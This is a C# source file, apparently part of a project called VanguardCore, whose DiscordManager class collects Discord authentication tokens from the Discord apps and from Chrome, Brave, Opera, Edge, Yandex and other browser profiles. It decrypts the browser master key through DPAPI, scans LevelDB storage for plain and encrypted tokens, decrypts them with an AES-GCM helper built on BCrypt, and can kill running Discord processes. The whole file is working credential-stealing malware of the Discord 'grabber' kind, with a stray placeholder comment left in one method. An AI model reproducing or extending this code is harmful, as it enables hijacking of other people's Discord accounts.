using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Runtime.InteropServices;

namespace VanguardCore
{
    public class DiscordManager
    {
        private static readonly string[] DiscordPaths = {
            "discord", "discordcanary", "discordptb", "discorddevelopment", "lightcord",
            "Google\\Chrome\\User Data\\Default", "Google\\Chrome\\User Data\\Profile 1", "Google\\Chrome\\User Data\\Profile 2",
            "BraveSoftware\\Brave-Browser\\User Data\\Default", "BraveSoftware\\Brave-Browser\\User Data\\Profile 1",
            "Opera Software\\Opera Stable", "Opera Software\\Opera GX Stable",
            "Yandex\\YandexBrowser\\User Data\\Default", "Yandex\\YandexBrowser\\User Data\\Profile 1",
            "Microsoft\\Edge\\User Data\\Default", "Microsoft\\Edge\\User Data\\Profile 1",
            "Vivaldi\\User Data\\Default", "Vivaldi\\User Data\\Profile 1",
            "Epic Privacy Browser\\User Data\\Default", "uCozMedia\\Uran\\User Data\\Default",
            "Iridium\\User Data\\Default", "CentBrowser\\User Data\\Default"
        };

        private static readonly Regex TokenRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
        private static readonly Regex EncryptedTokenRegex = new Regex(@"dQw4w9WgXcQ:[^""\s<>]+", RegexOptions.Compiled);

        public static bool IsDiscordRunning()
        {
            try {
                foreach (var proc in System.Diagnostics.Process.GetProcesses()) {
                    string name = proc.ProcessName.ToLower();
                    if (name.Contains("discord")) return true;
                }
            } catch { }
            return false;
        }

        public static void KillDiscord()
        {
            try {
                foreach (var proc in System.Diagnostics.Process.GetProcesses()) {
                    string name = proc.ProcessName.ToLower();
                    if (name.Contains("discord")) {
                        try { proc.Kill(); } catch { }
                    }
                }
            } catch { }
        }

        public static string GetTokens()

        {
            List<string> tokens = new List<string>();
            string appdata = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string localappdata = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

            foreach (string folder in DiscordPaths)
            {
                string path = Path.Combine(appdata, folder);
                if (!Directory.Exists(path))
                {
                    path = Path.Combine(localappdata, folder);
                    if (!Directory.Exists(path)) continue;
                }
// ... [rest of existing GetTokens logic] ...


                byte[] masterKey = GetMasterKey(Path.Combine(path, "Local State"));
                if (masterKey == null)
                    masterKey = GetMasterKey(Path.Combine(Directory.GetParent(path).FullName, "Local State"));

                // Traditional LevelDB
                string leveldb = Path.Combine(path, "Local Storage", "leveldb");
                if (Directory.Exists(leveldb))
                {
                    ScanDirectory(leveldb, tokens, masterKey);
                }

                // Newer 'storage' directory
                string storage = Path.Combine(path, "storage");
                if (Directory.Exists(storage))
                {
                    ScanDirectory(storage, tokens, masterKey);
                }

                if (masterKey != null) Array.Clear(masterKey, 0, masterKey.Length);
            }

            return string.Join(";", tokens);
        }

        private static void ScanDirectory(string path, List<string> tokens, byte[] masterKey)
        {
            try
            {
                // Only scan top-level or specific directories to avoid hanging on large profiles
                string[] files = Directory.GetFiles(path, "*.*", SearchOption.TopDirectoryOnly);
                foreach (string file in files) {
                    string ext = Path.GetExtension(file).ToLower();
                    if (ext == ".ldb" || ext == ".log" || ext == ".sqlite") {
                        ScanFile(file, tokens, masterKey);
                    }
                }

                // Check for leveldb specifically if it exists as a subfolder
                string leveldb = Path.Combine(path, "leveldb");
                if (Directory.Exists(leveldb)) {
                    foreach (string file in Directory.GetFiles(leveldb, "*.ldb", SearchOption.TopDirectoryOnly))
                        ScanFile(file, tokens, masterKey);
                    foreach (string file in Directory.GetFiles(leveldb, "*.log", SearchOption.TopDirectoryOnly))
                        ScanFile(file, tokens, masterKey);
                }
            }
            catch { }
        }

        private static byte[] GetMasterKey(string path)
        {
            try
            {
                if (!File.Exists(path)) return null;
                string content = File.ReadAllText(path);
                if (!content.Contains("os_crypt")) return null;

                string encryptedKey = Regex.Match(content, @"""encrypted_key"":""([^""]+)""").Groups[1].Value;
                byte[] decodedKey = Convert.FromBase64String(encryptedKey);
                byte[] keyWithHeader = new byte[decodedKey.Length - 5];
                Array.Copy(decodedKey, 5, keyWithHeader, 0, decodedKey.Length - 5);

                return ProtectedData.Unprotect(keyWithHeader, null, DataProtectionScope.CurrentUser);
            }
            catch { return null; }
        }

        private static void ScanFile(string file, List<string> tokens, byte[] masterKey)
        {
            try
            {
                FileInfo fi = new FileInfo(file);
                if (fi.Length > 2 * 1024 * 1024) return; // Skip files larger than 2MB to prevent hanging

                byte[] bytes;
                using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    bytes = new byte[fs.Length];
                    fs.Read(bytes, 0, bytes.Length);
                }
                string content = Encoding.Default.GetString(bytes);

                // Legacy tokens
                foreach (Match m in TokenRegex.Matches(content))
                    if (!tokens.Contains(m.Value)) tokens.Add(m.Value);

                // Encrypted tokens
                if (masterKey != null)
                {
                    MatchCollection matches = EncryptedTokenRegex.Matches(content);
                    foreach (Match m in matches)
                    {
                        try
                        {
                            string matchValue = m.Value;
                            // Clean up trailing characters from memory dump/binary noise
                            int lastValid = -1;
                            for (int i = 0; i < matchValue.Length; i++) {
                                char c = matchValue[i];
                                // Base64 characters + prefix characters
                                if (!(char.IsLetterOrDigit(c) || c == ':' || c == '=' || c == '+' || c == '/' || c == '_' || c == '-')) {
                                    lastValid = i;
                                    break;
                                }
                            }
                            if (lastValid != -1) matchValue = matchValue.Substring(0, lastValid);
                            
                            // Filter out raw dQw4w9WgXcQ: blobs that are not followed by actual encrypted data
                            if (matchValue.Equals("dQw4w9WgXcQ:")) continue;

                            if (!matchValue.Contains(":")) continue;
                            string raw = matchValue.Split(':')[1];
                            if (string.IsNullOrEmpty(raw)) continue;

                            byte[] buffer = Convert.FromBase64String(raw);
                            string decrypted = DecryptToken(buffer, masterKey);
                            
                            if (!string.IsNullOrEmpty(decrypted))
                            {
                                decrypted = decrypted.Trim('\0', ' ', '\t', '\r', '\n');
                                // Basic validation for Discord token format: MTE... or mfa...
                                if (decrypted.Length > 40)
                                {
                                    if (!tokens.Contains(decrypted))
                                    {
                                        tokens.Add(decrypted);
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }
        }

        private static string DecryptToken(byte[] buffer, byte[] key)
        {
            try
            {
                if (buffer.Length < 15) return null;

                byte[] iv = new byte[12];
                Array.Copy(buffer, 3, iv, 0, 12);

                byte[] payload = new byte[buffer.Length - 15];
                Array.Copy(buffer, 15, payload, 0, buffer.Length - 15);

                byte[] decrypted = AesGcmDecrypt(payload, key, iv);
                if (decrypted == null) return null;

                string result = Encoding.UTF8.GetString(decrypted);
                
                // Clear sensitive data
                Array.Clear(decrypted, 0, decrypted.Length);
                return result;
            }
            catch { return null; }
        }

        private static byte[] AesGcmDecrypt(byte[] ciphertext, byte[] key, byte[] iv)
        {
            // Note: Since .NET Framework 4.5+ might not have AesGcm but we can use P/Invoke or simpler AES if not GCM
            // However, modern Discord IS GCM. I will use the BCrypt P/Invoke approach for robustness.
            return AesGcm.Decrypt(ciphertext, key, iv);
        }
    }

    // Helper for AES-GCM using P/Invoke to BCrypt
    public static class AesGcm
    {
        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        private static extern uint BCryptOpenAlgorithmProvider(out IntPtr hAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);

        [DllImport("bcrypt.dll", CharSet = CharSet.Unicode)]
        private static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, uint cbInput, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr hKey, IntPtr pbKeyObject, uint cbKeyObject, byte[] pbSecret, uint cbSecret, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, uint cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, uint cbIV, byte[] pbOutput, uint cbOutput, out uint pcbResult, uint dwFlags);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptDestroyKey(IntPtr hKey);

        [DllImport("bcrypt.dll")]
        private static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);

        [StructLayout(LayoutKind.Sequential)]
        private struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        {
            public int cbSize;
            public uint dwInfoVersion;
            public IntPtr pbNonce;
            public int cbNonce;
            public IntPtr pbAuthData;
            public int cbAuthData;
            public IntPtr pbTag;
            public int cbTag;
            public IntPtr pbMacContext;
            public int cbMacContext;
            public int cbAAD;
            public long cbData;
            public uint dwFlags;
        }

        private const uint BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION = 1;
        private const uint STATUS_SUCCESS = 0;
        private const uint STATUS_NOT_FOUND = 0xC0000225;

        public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
        {
            if (data == null || key == null || iv == null || data.Length < 16) return null;

            IntPtr hAlg = IntPtr.Zero;
            IntPtr hKey = IntPtr.Zero;
            GCHandle ivHandle = default(GCHandle);
            GCHandle tagHandle = default(GCHandle);

            try
            {
                // 1. Open algorithm provider - try variants
                string[] algNames = { "AES", "AES-GCM", "AES_GCM" };
                uint status = STATUS_NOT_FOUND;
                
                foreach (string alg in algNames)
                {
                    status = BCryptOpenAlgorithmProvider(out hAlg, alg, null, 0);
                    if (status == STATUS_SUCCESS) break;
                }

                if (status != STATUS_SUCCESS) return null;

                // 2. Set chaining mode
                byte[] chainMode = Encoding.Unicode.GetBytes("ChainingModeGCM");
                status = BCryptSetProperty(hAlg, "ChainingMode", chainMode, (uint)chainMode.Length, 0);
                if (status != STATUS_SUCCESS) return null;

                // 3. Generate key
                status = BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, (uint)key.Length, 0);
                if (status != STATUS_SUCCESS) return null;

                // 4. Split data
                byte[] tag = new byte[16];
                Array.Copy(data, data.Length - 16, tag, 0, 16);
                byte[] ciphertext = new byte[data.Length - 16];
                Array.Copy(data, 0, ciphertext, 0, data.Length - 16);

                // 5. Auth info
                var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
                info.cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));
                info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION;

                ivHandle = GCHandle.Alloc(iv, GCHandleType.Pinned);
                tagHandle = GCHandle.Alloc(tag, GCHandleType.Pinned);

                info.pbNonce = ivHandle.AddrOfPinnedObject();
                info.cbNonce = iv.Length;
                info.pbTag = tagHandle.AddrOfPinnedObject();
                info.cbTag = tag.Length;

                // 6. Decrypt
                byte[] output = new byte[ciphertext.Length];
                uint resultSize = 0;

                status = BCryptDecrypt(hKey, ciphertext, (uint)ciphertext.Length, ref info, null, 0, output, (uint)output.Length, out resultSize, 0);

                if (status != STATUS_SUCCESS) return null;
                
                if (resultSize < output.Length)
                    Array.Resize(ref output, (int)resultSize);

                return output;
            }
            catch { return null; }
            finally
            {
                if (ivHandle.IsAllocated) ivHandle.Free();
                if (tagHandle.IsAllocated) tagHandle.Free();
                
                if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
                if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }
    }
}
